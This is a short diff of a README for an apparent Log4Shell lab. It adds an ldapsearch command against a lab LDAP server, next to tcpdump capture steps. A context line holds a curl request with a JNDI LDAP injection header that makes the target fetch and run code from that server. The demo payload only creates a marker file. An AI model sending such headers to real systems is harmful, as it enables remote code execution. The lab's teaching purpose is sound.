@@ -78,7 +78,6 @@ $> curl vulnapp:8080 -H 'X-Api-Version: ${jndi:ldap://log4jldapserver:1389/Basic
 # install tcpdump on service container (Alpine)
 $> docker compose exec <srvcname> apk add tcpdump
 
-
 # extract log from contanier
 $> docker compose cp <srvcname>:/tmp/dump.log .
 
@@ -87,6 +86,9 @@ $> docker compose exec <srvcname> sh
 
 # run tcpdump in container
 $> tcpdump -i eth0 -w /tmp/dump.cap &
+
+# ldap search
+$> ldapsearch -p 1389 -h log4jldapserver -x -b "Basic/Command/Base64/dG91Y2ggL3RtcC9DeWdlbnRhRGVtbw=="
 ```
 
 ## Notes
